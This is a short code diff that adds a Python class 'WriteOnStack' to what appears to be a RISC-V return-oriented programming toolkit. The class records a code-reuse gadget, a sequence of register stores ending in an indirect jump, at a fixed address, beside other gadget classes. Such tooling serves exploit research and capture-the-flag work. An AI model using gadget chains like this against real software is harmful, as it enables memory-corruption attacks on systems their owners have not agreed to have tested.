@@ -47,6 +47,36 @@ class Charger(Gadget):
 
         return ans
 
+class WriteOnStack(Gadget):
+    '''
+    addi sp,sp,-144
+    sd ra, 72(sp)
+    sd a0, 8(sp)
+    sd a1, 16(sp)
+    sd a2, 24(sp)
+   	sd a3, 32(sp)
+   	sd a4, 40(sp)
+   	sd a5, 48(sp)
+   	sd a6, 56(sp)
+   	sd a7, 64(sp)
+   	fsd	fa0, 80(sp)
+   	fsd	fa1, 88(sp)
+   	fsd	fa2, 96(sp)
+   	fsd	fa3, 104(sp)
+   	fsd	fa4, 112(sp)
+   	fsd	fa5, 120(sp)
+   	fsd	fa6, 128(sp)
+   	fsd	fa7, 136(sp)
+   	slli a1, t1, 0x1
+   	mv a0, t0
+   	add	a1, a1, t1
+   	auipc a2, 0x5
+   	addi a2, a2, -620
+   	jalr a2
+    '''
+    def __init__(self):
+        super().__init__(0x3fdb0)
+
 class InitializeA3(Gadget):
     '''
     mv	a3, s7
